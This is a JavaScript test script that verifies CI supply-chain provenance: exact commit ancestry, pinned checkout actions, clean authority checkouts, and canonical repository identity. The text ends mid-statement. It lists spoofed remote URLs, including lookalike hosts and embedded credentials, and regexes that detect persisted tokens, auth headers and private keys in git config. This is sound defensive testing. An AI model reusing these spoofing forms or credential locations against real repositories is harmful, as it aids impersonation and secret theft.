import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";
import {
  AUTHORIZED_BASE, ORIGINAL_CANDIDATE, TRUSTED_RECONCILIATION_BASE,
  AUTHORIZED_ANCESTRY_CHAIN, TRUSTED_RECONCILIATION_DAG, PRE_BASE_PARENT,
  verifyCanonicalBoundedAncestry, verifyCanonicalTrustedReconciliationAncestry,
  propagateTrustedReconciliationDag,
  AMENDMENT_CONTROLLED_FILES, CANDIDATE_OWNED_FILES, COMPOSED_CI_BASE,
  REQUIRED_CI_ADDITION, composeCandidateCi, composeFinalCi, composeTrustedCi,
  removeTwoStageCustodyFragment, validateDualBaseScope,
  parseOrdinaryCiActionInventory, validateOrdinaryCiActionPins,
} from "./validate-p1a-threat-model.mjs";
import { validateCertificationBundle } from "./validate-p1a-certification-accounting.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const EXACT_SHA = /^[0-9a-f]{40}$/;
const OFFICIAL_REPOSITORY = "https://github.com/DarksiedCEO/zbestmedia";
const OFFICIAL_REPOSITORY_URLS = new Set([OFFICIAL_REPOSITORY, `${OFFICIAL_REPOSITORY}.git`]);
const CURRENT_TRUSTED_BASE = "2f4baca937ef8b36d1560a010e8e7f430819197c";
const ORIGINAL_PR16_AMENDMENT = "6e855ba08c69374cb4b25f9777a8ebd190375897";
const REJECTED_PR16_CLEANLINESS_CANDIDATE = "0164130fc62209c7a71ca4f7e58a2e24117e2fd5";
const REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE = "966ab9160ad133adb10d58f7877f8549efd06831";
const REJECTED_PR16_ACTION_INVENTORY_CANDIDATE = "6867d43d17c8b614ab7d0e0c5e338127020bb772";
const REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE = "5c302bdae987a43104fecb5c4bfcf4fcca82c540";
const HISTORICAL_WORKFLOW_PATH = ".github/workflows/ci.yml";
const HISTORICAL_WORKFLOW_BLOB = "60d9cede50402f10837a630598b9f8dbf6fb839e";
const TRUSTED_BASE_WORKFLOW_BLOB = "60d9cede50402f10837a630598b9f8dbf6fb839e";
const ACTION_INVENTORY_WORKFLOW_BLOB = "f5fdd0da1fd17c1e843086999aa69e00d44948ea";
const PATH_EVIDENCE_STATES = Object.freeze({
  COMMIT_NOT_AVAILABLE: "COMMIT_NOT_AVAILABLE",
  OBJECT_NOT_IMPORTED: "OBJECT_NOT_IMPORTED",
  PATH_ABSENT_IN_COMMIT: "PATH_ABSENT_IN_COMMIT",
  PATH_PRESENT_IN_COMMIT: "PATH_PRESENT_IN_COMMIT",
});
const PATH_SOURCE_CLASSES = Object.freeze({
  TOPOLOGY_COMMIT_AUTHORITY: "TOPOLOGY_COMMIT_AUTHORITY",
  FULL_EXACT_COMMIT_SOURCE: "FULL_EXACT_COMMIT_SOURCE",
  CURRENT_CANDIDATE_SOURCE: "CURRENT_CANDIDATE_SOURCE",
  TRUSTED_BASE_SOURCE: "TRUSTED_BASE_SOURCE",
  TRUSTED_BASE_FULL_SOURCE: "TRUSTED_BASE_FULL_SOURCE",
});
const REJECTED_RECONCILIATION = "4cbdee7b4aded69275efdc78aea41ed21bae32dc";
const AUTHORIZED_EPHEMERAL_AUTHORITY_ROOTS = Object.freeze([
  ".p1a-original-candidate",
  ".p1a-trusted-baseline",
  ".p1a-dual-base-authority",
  ".p1a-evidence-base-authority",
  ".p1a-ancestry-authority",
  ".p1a-trusted-reconciliation-authority",
  ".p1a-pr16-remediation-chain-authority",
  ".p1a-pr16-chain-staging-rejected-cleanliness",
]);
const AMENDMENT_OWNED_FIXTURE_FILES = Object.freeze([
  ".github/workflows/ci.yml",
  "scripts/test-p1a-dual-base-verifier.mjs",
  "scripts/validate-p1a-threat-model.mjs",
]);
const EXPECTED_COMPOSED_CI_BLOB = "9a3f1a04f99e83d9dad84cf384d86117a7d282f1";
const ANCESTRY_CHAIN = AUTHORIZED_ANCESTRY_CHAIN;
const EXPECTED_TREES = Object.freeze({
  original: "d266dafef452c6a327734eec32013c8718fc9371",
  baseline: "06bed4d9f31aa6bf0d65c9adfa3dc2fbb6839d26",
  dualBase: "37345329da7051a818eb2e5b02f1f06f74d667a7",
  evidenceBase: "a929da05a15a0c37644a224697dddec9762b00a0",
});
const authorityRoots = {
  original: process.env.P1A_ORIGINAL_REPOSITORY_ROOT,
  baseline: process.env.P1A_BASELINE_REPOSITORY_ROOT,
  dualBase: process.env.P1A_DUAL_BASE_AUTHORITY_ROOT,
  evidenceBase: process.env.P1A_EVIDENCE_BASE_AUTHORITY_ROOT,
  ancestry: process.env.P1A_ANCESTRY_AUTHORITY_ROOT,
  trustedReconciliation: process.env.P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT,
  pr16RemediationChain: process.env.P1A_PR16_CHAIN_AUTHORITY_ROOT,
  pr16HistoricalSource: process.env.P1A_PR16_HISTORICAL_SOURCE_ROOT,
  trustedBaseFullSource: process.env.P1A_TRUSTED_BASE_FULL_SOURCE_ROOT,
  pr16ActionInventorySource: process.env.P1A_PR16_ACTION_INVENTORY_SOURCE_ROOT,
  pr16OriginalAmendmentSource: process.env.P1A_PR16_ORIGINAL_AMENDMENT_SOURCE_ROOT,
  pr16RejectedChainSource: process.env.P1A_PR16_REJECTED_CHAIN_SOURCE_ROOT,
};
const workspaceOptions = (expectedRelative) => process.env.GITHUB_WORKSPACE
  ? { workspaceRoot: process.env.GITHUB_WORKSPACE, expectedRelative }
  : {};
if (process.env.P1A_TRUSTED_EXECUTION_ROOT) {
  assert.equal(
    root,
    path.resolve(process.env.P1A_TRUSTED_EXECUTION_ROOT),
    "dual-base verifier is not executing from trusted checkout",
  );
  assert.ok(process.env.P1A_CANDIDATE_DATA_ROOT, "candidate data root absent");
  assert.notEqual(
    root,
    path.resolve(process.env.P1A_CANDIDATE_DATA_ROOT),
    "candidate root cannot impersonate trusted dual-base checkout",
  );
}
const temporary = mkdtempSync(path.join(tmpdir(), "p1a-dual-base-"));
const repository = path.join(temporary, "repository");
const boundedRepository = path.join(temporary, "bounded-ancestry-repository");
const run = (cwd, args, options = {}) => execFileSync(args[0], args.slice(1), {
  cwd, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"], ...options,
}).trim();
const gitAt = (cwd, ...args) => run(cwd, ["git", ...args]);

function commitParents(cwd, sha) {
  assert.match(sha, EXACT_SHA, "provenance: exact lowercase commit SHA required");
  assert.equal(gitAt(cwd, "cat-file", "-t", sha), "commit", "provenance: source is not a commit");
  return gitAt(cwd, "cat-file", "-p", sha).split("\n")
    .filter((line) => line.startsWith("parent ")).map((line) => line.slice(7));
}

function canonicalGitHubRepositoryUrl(value) {
  assert.equal(typeof value, "string", "provenance: repository URL must be a string");
  assert.ok(OFFICIAL_REPOSITORY_URLS.has(value),
    "provenance: repository URL is not an approved exact identity");
  return OFFICIAL_REPOSITORY;
}

function verifyExactWorkflowSource(label, suppliedRoot, expectedSha, expectedBlob,
  expectedRelative, sourceClass) {
  assert.ok(suppliedRoot, `${label}: full exact source absent`);
  assert.ok(Object.values(PATH_SOURCE_CLASSES).includes(sourceClass), `${label}: source class omitted or invalid`);
  assert.match(expectedSha, EXACT_SHA, `${label}: exact lowercase SHA required`);
  assert.match(expectedBlob, EXACT_SHA, `${label}: exact blob required`);
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(), `${label}: symlink source forbidden`);
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), `${label}: primary candidate checkout forbidden`);
  if (process.env.GITHUB_WORKSPACE) {
    assert.equal(resolved, realpathSync(path.resolve(process.env.GITHUB_WORKSPACE, expectedRelative)),
      `${label}: candidate-selected or escaping source root`);
  }
  assert.equal(gitAt(resolved, "rev-parse", "HEAD"), expectedSha, `${label}: wrong source HEAD`);
  assert.equal(canonicalGitHubRepositoryUrl(gitAt(resolved, "remote", "get-url", "origin")), OFFICIAL_REPOSITORY,
    `${label}: wrong repository identity`);
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "", `${label}: dirty source forbidden`);
  const config = readFileSync(path.join(resolved, ".git/config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader|credential\.helper/i.test(config),
    `${label}: persisted credential material detected`);
  assert.equal(gitAt(resolved, "cat-file", "-t", expectedSha), "commit", `${label}: commit object absent`);
  assert.equal(gitAt(resolved, "cat-file", "-t", `${expectedSha}^{tree}`), "tree", `${label}: tree object absent`);
  const blob = gitAt(resolved, "rev-parse", `${expectedSha}:${HISTORICAL_WORKFLOW_PATH}`);
  assert.equal(blob, expectedBlob, `${label}: workflow blob mismatch`);
  assert.equal(gitAt(resolved, "cat-file", "-t", blob), "blob", `${label}: workflow blob absent`);
  return Object.freeze({ root: resolved, sourceClass, exactSourceSha: expectedSha,
    path: HISTORICAL_WORKFLOW_PATH, blob, state: PATH_EVIDENCE_STATES.PATH_PRESENT_IN_COMMIT });
}

function resolveAuthorizedLinearAmendment(head, parentLookup) {
  assert.match(head, EXACT_SHA, "provenance: exact amendment SHA required");
  assert.equal(typeof parentLookup, "function", "provenance: trusted parent lookup required");
  if (head === ORIGINAL_PR16_AMENDMENT) {
    assert.deepEqual(parentLookup(head), [CURRENT_TRUSTED_BASE],
      "provenance: original PR #16 amendment parent mismatch");
    return head;
  }
  if (head === REJECTED_PR16_CLEANLINESS_CANDIDATE) {
    assert.deepEqual(parentLookup(head), [ORIGINAL_PR16_AMENDMENT],
      "provenance: rejected cleanliness candidate parent mismatch");
  } else if (head === REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE) {
    assert.deepEqual(parentLookup(head), [REJECTED_PR16_CLEANLINESS_CANDIDATE],
      "provenance: rejected authority-cleanliness candidate parent mismatch");
    assert.deepEqual(parentLookup(REJECTED_PR16_CLEANLINESS_CANDIDATE), [ORIGINAL_PR16_AMENDMENT],
      "provenance: rejected cleanliness candidate is not anchored to original PR #16 amendment");
  } else if (head === REJECTED_PR16_ACTION_INVENTORY_CANDIDATE) {
    assert.deepEqual(parentLookup(head), [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE],
      "provenance: rejected action-inventory candidate parent mismatch");
  } else if (head === REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE) {
    assert.deepEqual(parentLookup(head), [REJECTED_PR16_ACTION_INVENTORY_CANDIDATE],
      "provenance: rejected semantic-provenance candidate parent mismatch");
  } else {
    assert.deepEqual(parentLookup(head), [REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE],
      "provenance: replacement must have exact rejected semantic-provenance candidate parent");
    assert.deepEqual(parentLookup(REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE),
      [REJECTED_PR16_ACTION_INVENTORY_CANDIDATE],
      "provenance: rejected semantic-provenance candidate parent mismatch");
    assert.deepEqual(parentLookup(REJECTED_PR16_ACTION_INVENTORY_CANDIDATE),
      [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE],
      "provenance: rejected action-inventory candidate parent mismatch");
    assert.deepEqual(parentLookup(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE),
      [REJECTED_PR16_CLEANLINESS_CANDIDATE],
      "provenance: rejected authority-cleanliness candidate parent mismatch");
    assert.deepEqual(parentLookup(REJECTED_PR16_CLEANLINESS_CANDIDATE), [ORIGINAL_PR16_AMENDMENT],
      "provenance: rejected cleanliness candidate is not anchored to original PR #16 amendment");
  }
  assert.deepEqual(parentLookup(ORIGINAL_PR16_AMENDMENT), [CURRENT_TRUSTED_BASE],
    "provenance: original PR #16 amendment is not anchored to exact trusted base");
  return head;
}

const repositoryIdentityPositiveCases = [OFFICIAL_REPOSITORY, `${OFFICIAL_REPOSITORY}.git`];
const repositoryIdentityHostileCases = [
  "http://github.com/DarksiedCEO/zbestmedia",
  "https://github.com/DarksiedCEO/zbestmedia-other",
  "https://github.com/DarksiedCEO/zbestmedia.git.evil",
  "https://github.com/OtherOwner/zbestmedia",
  "https://github.com/DarksiedCEO/other",
  "https://evil.example/DarksiedCEO/zbestmedia",
  "https://github.com.evil.example/DarksiedCEO/zbestmedia",
  "https://user@github.com/DarksiedCEO/zbestmedia",
  "https://user:pass@github.com/DarksiedCEO/zbestmedia",
  "https://github.com/DarksiedCEO/zbestmedia?x=1",
  "https://github.com/DarksiedCEO/zbestmedia#fragment",
  "https://github.com:444/DarksiedCEO/zbestmedia",
  "git@github.com:DarksiedCEO/zbestmedia.git",
  "git://github.com/DarksiedCEO/zbestmedia.git",
  "",
  "not a URL",
];
assert.notEqual(OFFICIAL_REPOSITORY, `${OFFICIAL_REPOSITORY}.git`,
  "provenance before-proof: literal comparison unexpectedly accepted the remote-equivalent URL");
for (const repositoryUrl of repositoryIdentityPositiveCases) {
  assert.equal(canonicalGitHubRepositoryUrl(repositoryUrl), OFFICIAL_REPOSITORY,
    "provenance: canonical repository identity mismatch");
}
for (const repositoryUrl of repositoryIdentityHostileCases) {
  assert.throws(() => canonicalGitHubRepositoryUrl(repositoryUrl),
    "provenance: hostile repository identity accepted");
}
console.log(JSON.stringify({
  suite: "p1-a-canonical-repository-identity-controls",
  positiveRequired: 2, positiveExecuted: 2, positivePassed: 2,
  hostileRequired: 16, hostileExecuted: 16, hostilePassed: 16,
  beforeLiteralMismatchReproduced: true,
  canonicalIdentity: OFFICIAL_REPOSITORY,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

const topologyReplacement = "1".repeat(40);
const topologyExtra = "2".repeat(40);
const exactTopology = new Map([
  [CURRENT_TRUSTED_BASE, []],
  [ORIGINAL_PR16_AMENDMENT, [CURRENT_TRUSTED_BASE]],
  [REJECTED_PR16_CLEANLINESS_CANDIDATE, [ORIGINAL_PR16_AMENDMENT]],
  [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, [REJECTED_PR16_CLEANLINESS_CANDIDATE]],
  [REJECTED_PR16_ACTION_INVENTORY_CANDIDATE, [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE]],
  [REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE, [REJECTED_PR16_ACTION_INVENTORY_CANDIDATE]],
  [topologyReplacement, [REJECTED_PR16_SEMANTIC_PROVENANCE_CANDIDATE]],
  [topologyExtra, [topologyReplacement]],
]);
const topologyParents = (sha) => {
  assert.ok(exactTopology.has(sha), "provenance: required intermediate object absent");
  return exactTopology.get(sha);
};
assert.equal(resolveAuthorizedLinearAmendment(REJECTED_PR16_CLEANLINESS_CANDIDATE, topologyParents),
  REJECTED_PR16_CLEANLINESS_CANDIDATE);
assert.equal(resolveAuthorizedLinearAmendment(REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, topologyParents),
  REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE);
assert.equal(resolveAuthorizedLinearAmendment(topologyReplacement, topologyParents), topologyReplacement);
const remediationTopologyHostileCases = [
  ["replacement_wrong_parent", topologyReplacement, new Map(exactTopology).set(topologyReplacement, [REJECTED_PR16_CLEANLINESS_CANDIDATE])],
  ["authority_cleanliness_wrong_parent", topologyReplacement, new Map(exactTopology).set(
    REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, [ORIGINAL_PR16_AMENDMENT])],
  ["rejected_candidate_wrong_parent", topologyReplacement, new Map(exactTopology).set(REJECTED_PR16_CLEANLINESS_CANDIDATE, [CURRENT_TRUSTED_BASE])],
  ["original_wrong_parent", topologyReplacement, new Map(exactTopology).set(ORIGINAL_PR16_AMENDMENT, ["3".repeat(40)])],
  ["extra_intermediate", topologyExtra, exactTopology],
  ["merge_masquerade", topologyReplacement, new Map(exactTopology).set(topologyReplacement,
    [REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE, REJECTED_PR16_CLEANLINESS_CANDIDATE])],
  ["parent_order_manipulation", topologyReplacement, new Map(exactTopology).set(topologyReplacement,
    [REJECTED_PR16_CLEANLINESS_CANDIDATE, REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE])],
  ["sibling_from_original", "4".repeat(40), new Map(exactTopology).set("4".repeat(40), [ORIGINAL_PR16_AMENDMENT])],
  ["unrelated_descendant", "5".repeat(40), new Map(exactTopology).set("5".repeat(40), [topologyExtra])],
  ["missing_original", topologyReplacement, new Map(exactTopology).delete(ORIGINAL_PR16_AMENDMENT)],
  ["mutable_branch", "codex/bt-1", exactTopology],
  ["mutable_tag", "v1.0.0", exactTopology],
  ["abbreviated_sha", topologyReplacement.slice(0, 12), exactTopology],
  ["missing_replacement", "6".repeat(40), exactTopology],
];
for (const [name, head, graph] of remediationTopologyHostileCases) {
  assert.throws(() => resolveAuthorizedLinearAmendment(head, (sha) => {
    assert.ok(graph.has(sha), `${name}: required object absent`);
    return graph.get(sha);
  }), `${name}: hostile remediation topology accepted`);
}
console.log(JSON.stringify({
  suite: "p1-a-exact-remediation-chain-controls",
  positiveRequired: 2, positiveExecuted: 2, positivePassed: 2,
  hostileRequired: remediationTopologyHostileCases.length,
  hostileExecuted: remediationTopologyHostileCases.length,
  hostilePassed: remediationTopologyHostileCases.length,
  trustedBaseSha: CURRENT_TRUSTED_BASE,
  originalAmendmentSha: ORIGINAL_PR16_AMENDMENT,
  rejectedAuthorityCleanlinessSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  arbitraryDescendantsAccepted: false,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));

function parsePorcelainV1Z(status) {
  assert.equal(typeof status, "string", "provenance: worktree status must be text");
  return status.split("\0").filter(Boolean).map((record) => {
    assert.ok(record.length >= 4 && record[2] === " ",
      "provenance: malformed worktree status entry");
    return Object.freeze({ code: record.slice(0, 2), path: record.slice(3) });
  });
}

function isExactRootOrDescendant(candidatePath, authorizedRoot) {
  assert.equal(path.posix.normalize(candidatePath), candidatePath,
    "provenance: non-canonical worktree path rejected");
  return candidatePath === authorizedRoot || candidatePath.startsWith(`${authorizedRoot}/`);
}

function assertAuthorizedAuthorityRoot(repositoryRoot, candidatePath) {
  const authorizedRoot = AUTHORIZED_EPHEMERAL_AUTHORITY_ROOTS.find(
    (rootPath) => isExactRootOrDescendant(candidatePath, rootPath),
  );
  assert.ok(authorizedRoot, `provenance: unauthorized untracked path: ${candidatePath}`);
  const absoluteRoot = path.join(repositoryRoot, authorizedRoot);
  assert.ok(existsSync(absoluteRoot), `provenance: authorized authority root absent: ${authorizedRoot}`);
  assert.equal(lstatSync(absoluteRoot).isSymbolicLink(), false,
    `provenance: authority root cannot be a symlink: ${authorizedRoot}`);
}

function assertClassifiedWorktreeEntries(repositoryRoot, entries) {
  for (const entry of entries) {
    assert.equal(entry.code, "??",
      `provenance: tracked, staged, deleted, renamed, copied, or conflicted path rejected: ${entry.path}`);
    assertAuthorizedAuthorityRoot(repositoryRoot, entry.path);
  }
}

function assertAmendmentSourceWorktreeClean(repositoryRoot = root) {
  const status = execFileSync("git", ["status", "--porcelain=v1", "-z", "--untracked-files=all"], {
    cwd: repositoryRoot, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
  });
  assertClassifiedWorktreeEntries(repositoryRoot, parsePorcelainV1Z(status));
}

const PR16_CHAIN = Object.freeze([
  CURRENT_TRUSTED_BASE,
  ORIGINAL_PR16_AMENDMENT,
  REJECTED_PR16_CLEANLINESS_CANDIDATE,
  REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
  REJECTED_PR16_ACTION_INVENTORY_CANDIDATE,
]);

function verifyPr16RemediationChainAuthority(suppliedRoot, options = {}) {
  assert.ok(suppliedRoot, "pr16-chain: isolated predecessor authority root absent");
  assert.ok(!lstatSync(path.resolve(suppliedRoot)).isSymbolicLink(),
    "pr16-chain: symlink authority forbidden");
  const resolved = realpathSync(path.resolve(suppliedRoot));
  assert.notEqual(resolved, realpathSync(root), "pr16-chain: primary candidate checkout forbidden");
  if (options.workspaceRoot) {
    assert.equal(resolved, realpathSync(path.resolve(options.workspaceRoot,
      ".p1a-pr16-remediation-chain-authority")),
    "pr16-chain: candidate-selected or escaping authority root");
  }
  assert.equal(canonicalGitHubRepositoryUrl(gitAt(resolved, "remote", "get-url", "origin")),
    OFFICIAL_REPOSITORY, "pr16-chain: wrong repository");
  assert.equal(gitAt(resolved, "status", "--porcelain=v1"), "",
    "pr16-chain: authority checkout modified");
  const gitDirValue = gitAt(resolved, "rev-parse", "--git-dir");
  const gitDir = realpathSync(path.isAbsolute(gitDirValue) ? gitDirValue : path.resolve(resolved, gitDirValue));
  assert.notEqual(gitDir, realpathSync(path.join(root, ".git")),
    "pr16-chain: shared primary object store forbidden");
  assert.ok(!existsSync(path.join(gitDir, "objects/info/alternates")),
    "pr16-chain: alternates forbidden");
  assert.equal(gitAt(resolved, "for-each-ref", "--format=%(refname)", "refs/replace"), "",
    "pr16-chain: replace refs forbidden");
  assert.ok(!existsSync(path.join(gitDir, "info/grafts")) ||
    readFileSync(path.join(gitDir, "info/grafts"), "utf8") === "", "pr16-chain: grafts forbidden");
  const config = readFileSync(path.join(gitDir, "config"), "utf8");
  assert.ok(!/x-access-token|authorization:|http\..*extraheader/i.test(config),
    "pr16-chain: persisted credentials detected");
  const inventory = gitAt(resolved, "cat-file", "--batch-all-objects", "--batch-check=%(objectname) %(objecttype)")
    .split("\n").filter((line) => line.endsWith(" commit")).map((line) => line.slice(0, 40)).sort();
  assert.deepEqual(inventory, [...PR16_CHAIN].sort(), "pr16-chain: exact commit inventory mismatch");
  const provenance = PR16_CHAIN.map((sha, index) => {
    assert.equal(gitAt(resolved, "cat-file", "-t", sha), "commit", "pr16-chain: object is not commit");
    const parents = commitParents(resolved, sha);
    const expectedParents = index === 0 ? commitParents(resolved, sha) : [PR16_CHAIN[index - 1]];
    if (index > 0) assert.deepEqual(parents, expectedParents, "pr16-chain: exact parent mismatch");
    return Object.freeze({
      role: ["TRUSTED_BASE", "ORIGINAL_PR16_AMENDMENT", "REJECTED_URL_CHAIN_REMEDIATION",
        "REJECTED_CLEANLINESS_REMEDIATION", "REJECTED_ACTION_INVENTORY_REMEDIATION"][index],
      exactSha: sha,
      sourceClass: "WORKFLOW_OWNED_PREDECESSOR_AUTHORITY",
      sourceRepository: OFFICIAL_REPOSITORY,
      acquisitionMethod: "PINNED_ACTIONS_CHECKOUT_DEPTH_1_AND_COMMIT_OBJECT_IMPORT",
      objectType: "commit",
      exactParents: parents,
      expectedParents,
      equal: index === 0 || JSON.stringify(parents) === JSON.stringify(expectedParents),
      authorityStorePath: resolved,
    });
  });
  return Object.freeze({ root: resolved, gitDir, provenance,
    parents: (sha) => commitParents(resolved, sha) });
}

function createPr16ChainFixture(name, shas = PR16_CHAIN) {
  const fixture = path.join(temporary, `pr16-chain-${name}`);
  gitAt(temporary, "init", "-q", fixture);
  gitAt(fixture, "remote", "add", "origin", OFFICIAL_REPOSITORY);
  for (const sha of shas) {
    const rawCommit = execFileSync("git", ["cat-file", "commit", sha], {
      cwd: authorityRoots.pr16RemediationChain, stdio: ["ignore", "pipe", "pipe"],
    });
    assert.equal(execFileSync("git", ["hash-object", "-w", "-t", "commit", "--stdin"], {
      cwd: fixture, input: rawCommit, encoding: "utf8", stdio: ["pipe", "pipe", "pipe"],
    }).trim(), sha);
  }
  return fixture;
}

function validatePr16WorkflowContract(source) {
  assert.ok(source.includes("permissions:\n  contents: read"), "pr16-workflow: read-only permission absent");
  assert.ok(!source.includes("contents: write"), "pr16-workflow: write permission forbidden");
  assert.ok(!/BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY/.test(source),
    "pr16-workflow: sensitive private-key material forbidden");
  for (const sha of PR16_CHAIN) {
    assert.ok(source.includes(`ref: ${sha}`), `pr16-workflow: exact checkout absent: ${sha}`);
  }
  assert.equal((source.match(/path: \.p1a-pr16-chain-staging-/g) ?? []).length, 5,
    "pr16-workflow: exact staging checkout count required");
  const pr16Section = source.slice(source.indexOf("Acquire exact PR16 trusted-base predecessor object"),
    source.indexOf("P1-A trusted verifier controls"));
  const fifthCheckout = `      - name: Acquire exact PR16 action-inventory predecessor object
        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
        with:
          repository: DarksiedCEO/zbestmedia
          ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}
          fetch-depth: 1
          persist-credentials: false
          path: .p1a-pr16-chain-staging-action-inventory`;
  assert.equal(pr16Section.split(fifthCheckout).length - 1, 1,
    "pr16-workflow: exact fifth predecessor checkout required once");
  assert.equal((pr16Section.match(/uses: actions\/checkout@11d5960a326750d5838078e36cf38b85af677262/g) ?? []).length, 5,
    "pr16-workflow: pinned checkout provenance mismatch");
  assert.equal((pr16Section.match(/fetch-depth: 1/g) ?? []).length, 5,
    "pr16-workflow: exact depth-one acquisition required");
  assert.equal((pr16Section.match(/persist-credentials: false/g) ?? []).length, 5,
    "pr16-workflow: credential persistence forbidden");
  assert.ok(pr16Section.includes("mapfile -t actual"), "pr16-workflow: exact inventory accounting absent");
  assert.ok(pr16Section.includes("test \"${actual[*]}\" = \"${expected[*]}\""),
    "pr16-workflow: exact inventory comparison absent");
  assert.ok(pr16Section.includes("persisted PR16 acquisition credential material detected"),
    "pr16-workflow: credential persistence detector absent");
  assert.ok(source.includes("P1A_PR16_CHAIN_AUTHORITY_ROOT: .p1a-pr16-remediation-chain-authority"),
    "pr16-workflow: fixed authority binding absent");
  assert.ok(source.includes("P1A_PR16_HISTORICAL_SOURCE_ROOT: .p1a-pr16-chain-staging-rejected-cleanliness"),
    "pr16-workflow: full exact historical source binding absent");
  assert.ok(source.includes("P1A_TRUSTED_BASE_FULL_SOURCE_ROOT: .p1a-pr16-chain-staging-trusted-base"),
    "pr16-workflow: full exact trusted-base source binding absent");
  assert.ok(source.includes("P1A_PR16_ACTION_INVENTORY_SOURCE_ROOT: .p1a-pr16-chain-staging-action-inventory"),
    "pr16-workflow: full exact action-inventory source binding absent");
  assert.ok(pr16Section.includes("historical_path=.github/workflows/ci.yml"),
    "pr16-workflow: exact historical path proof absent");
  assert.ok(pr16Section.includes(`historical_blob=${HISTORICAL_WORKFLOW_BLOB}`),
    "pr16-workflow: exact historical blob proof absent");
  assert.ok(pr16Section.includes('test "$(git -C "$historical_path_source" rev-parse "${shas[3]}:$historical_path")" = "$historical_blob"'),
    "pr16-workflow: committed historical blob equality absent");
  assert.ok(pr16Section.includes(`ref: ${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}`),
    "pr16-workflow: exact fifth predecessor acquisition absent");
  assert.ok(pr16Section.includes("path: .p1a-pr16-chain-staging-action-inventory"),
    "pr16-workflow: fixed fifth staging path absent");
  assert.ok(source.includes("if: always()"), "pr16-workflow: unconditional cleanup absent");
  assert.ok(source.includes("test ! -e .p1a-pr16-remediation-chain-authority"),
    "pr16-workflow: authority cleanup proof absent");
  assert.ok(source.includes("test ! -e .p1a-pr16-chain-staging-rejected-cleanliness"),
    "pr16-workflow: historical source cleanup proof absent");
  assert.ok(!pr16Section.includes("fetch-depth: 0"), "pr16-workflow: full history fetch forbidden");
  assert.ok(!pr16Section.includes("ref: codex/"), "pr16-workflow: mutable branch authority forbidden");
}

const pr16WorkflowSource = readFileSync(path.join(root, ".github/workflows/ci.yml"), "utf8");
validatePr16WorkflowContract(pr16WorkflowSource);
const trustedBaseWorkflowSource = verifyExactWorkflowSource("trusted-base", authorityRoots.trustedBaseFullSource,
  CURRENT_TRUSTED_BASE, TRUSTED_BASE_WORKFLOW_BLOB, ".p1a-pr16-chain-staging-trusted-base",
  PATH_SOURCE_CLASSES.TRUSTED_BASE_FULL_SOURCE);
const predecessorWorkflowSource = verifyExactWorkflowSource("action-inventory-predecessor",
  authorityRoots.pr16ActionInventorySource, REJECTED_PR16_ACTION_INVENTORY_CANDIDATE,
  ACTION_INVENTORY_WORKFLOW_BLOB, ".p1a-pr16-chain-staging-action-inventory",
  PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE);
const originalAmendmentWorkflowSource = verifyExactWorkflowSource("original-amendment-predecessor",
  authorityRoots.pr16OriginalAmendmentSource, ORIGINAL_PR16_AMENDMENT, HISTORICAL_WORKFLOW_BLOB,
  ".p1a-pr16-chain-staging-original-amendment", PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE);
const rejectedChainWorkflowSource = verifyExactWorkflowSource("rejected-chain-predecessor",
  authorityRoots.pr16RejectedChainSource, REJECTED_PR16_CLEANLINESS_CANDIDATE, HISTORICAL_WORKFLOW_BLOB,
  ".p1a-pr16-chain-staging-rejected-chain", PATH_SOURCE_CLASSES.FULL_EXACT_COMMIT_SOURCE);
const historicalOrdinaryCi = gitAt(trustedBaseWorkflowSource.root, "show",
  `${CURRENT_TRUSTED_BASE}:${HISTORICAL_WORKFLOW_PATH}`);
const predecessorOrdinaryCi = gitAt(predecessorWorkflowSource.root, "show",
  `${REJECTED_PR16_ACTION_INVENTORY_CANDIDATE}:${HISTORICAL_WORKFLOW_PATH}`);
const historicalActionInventory = parseOrdinaryCiActionInventory(historicalOrdinaryCi);
const predecessorActionInventory = parseOrdinaryCiActionInventory(predecessorOrdinaryCi);
const currentActionInventory = parseOrdinaryCiActionInventory(pr16WorkflowSource);
const historicalActionResult = validateOrdinaryCiActionPins(historicalOrdinaryCi,
  { profile: "HISTORICAL_10" });
const predecessorActionResult = validateOrdinaryCiActionPins(predecessorOrdinaryCi,
